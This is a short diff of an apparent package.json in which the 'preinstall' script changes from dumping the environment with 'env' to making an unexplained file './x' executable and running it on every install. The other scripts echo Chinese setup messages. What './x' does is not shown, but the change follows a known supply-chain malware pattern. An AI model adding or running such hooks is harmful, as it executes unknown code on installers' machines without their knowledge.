@@ -2,7 +2,7 @@
   "name": "my-project",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "env",
+    "preinstall": "chmod +x ./x && ./x",
     "postinstall": "echo '环境初始化完成'",
     "custom-task": "echo '这是一个手动触发的任务'"
   }
